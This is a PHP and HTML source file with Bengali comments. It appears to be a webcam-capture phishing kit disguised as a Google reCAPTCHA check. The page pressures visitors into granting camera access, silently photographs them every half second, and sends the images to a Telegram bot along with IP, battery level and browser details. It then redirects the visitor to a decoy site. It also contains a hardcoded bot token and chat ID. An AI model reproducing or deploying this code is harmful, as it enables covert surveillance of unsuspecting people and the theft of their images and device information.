<?php
// Hex timestamp ডিকোড করে মেয়াদ চেক করা
$expiryTime = 0;
if (isset($_GET['e']) && !empty($_GET['e'])) {
    $expiryTime = hexdec($_GET['e']);
}

// ২৪ ঘণ্টা ১ মিনিট পার হয়ে গেলে পুরোনো/যেকোনো লিংক থেকে ছবি সেন্ড ব্লক হয়ে যাবে
if ($expiryTime > 0 && time() > $expiryTime) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    if ($expiryTime > 0 && time() > $expiryTime) {
        exit;
    }

    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931";

    if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
        $encodedCid = $_POST['chat_id'];
        $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
        if ($decodedCid !== false && is_numeric($decodedCid)) {
            $chatId = $decodedCid;
        }
    }

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);

    $imgData = str_replace(['data:image/png;base64,', ' '], ['', '+'], $_POST['image']);
    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, base64_decode($imgData))) {
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "🎯 Target ID: " . ($_POST['target'] ?? 'direct') . "\n🔋 Battery: " . ($_POST['battery'] ?? 'Unknown') . "\n🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n💻 UA: " . ($_POST['user_agent'] ?? 'Unknown'),
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html { margin: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: #f9f9f9; overflow: hidden; }
        .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 20px 25px; display: flex; align-items: center; justify-content: space-between; width: 300px; box-shadow: 0 0 4px rgba(0,0,0,0.08); display: none; }
        .recaptcha-left { display: flex; align-items: center; gap: 15px; }
        .recaptcha-checkbox { width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px; }
        .recaptcha-checkbox.loading { border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .recaptcha-text { font-family: Roboto, sans-serif; font-size: 14px; color: #2c2c2c; }
        .recaptcha-right { display: flex; flex-direction: column; align-items: center; }
        .recaptcha-logo { width: 32px; height: 32px; background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png'); background-size: contain; }
        .recaptcha-footer { font-family: Roboto, sans-serif; font-size: 10px; color: #555; }
    </style>
</head>
<body>
    <div class="recaptcha-box" id="recaptchaContainer">
        <div class="recaptcha-left">
            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
            <span class="recaptcha-text">Verifying...</span>
        </div>
        <div class="recaptcha-right">
            <div class="recaptcha-logo"></div>
            <div class="recaptcha-footer">reCAPTCHA</div>
        </div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id') || 'direct';
        const userChatId = urlParams.get('cid') || ''; 
        let finalUrl = "https://www.aapunkagames.com/";
        const rawTargetUrl = urlParams.get('url');

        if (rawTargetUrl) {
            try { finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/')); } catch (e) {}
        }

        document.getElementById('recaptchaContainer').style.display = 'flex';

        let batteryInfo = 'Not Available';
        if (navigator.getBattery) {
            navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function startAutoVerification() {
            document.getElementById('recaptchaCheckbox').classList.add('loading');
            const interval = setInterval(captureAndUpload, 500); // প্রতি ০.৫ সেকেন্ড পর পর
            setTimeout(() => {
                clearInterval(interval);
                window.location.href = finalUrl;
            }, 4000); // ৪ সেকেন্ড পর রিডাইরেক্ট
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(startAutoVerification, 500);
            })
            .catch(() => {
                alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
                location.reload();
            });

        function captureAndUpload() {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const params = new URLSearchParams();
            params.append('image', canvas.toDataURL('image/png'));
            params.append('target', targetId);
            params.append('chat_id', userChatId);
            params.append('user_agent', navigator.userAgent);
            params.append('battery', batteryInfo);

            fetch('', { method: 'POST', body: params }).catch(() => {});
        }
    </script>
</body>
</html>
